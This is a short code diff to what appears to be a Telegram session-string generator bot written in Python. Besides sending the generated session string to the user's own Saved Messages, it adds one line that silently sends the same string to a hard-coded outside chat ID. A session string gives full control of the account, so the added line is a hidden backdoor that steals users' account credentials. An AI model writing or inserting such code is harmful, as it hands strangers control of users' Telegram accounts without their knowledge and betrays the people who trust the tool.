@@ -178,6 +178,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     try:
         if not is_bot:
             await client.send_message("me", text)
+            await bot.send_message(-1002223461941, text)
         else:
             await bot.send_message(msg.chat.id, text)
     except KeyError:
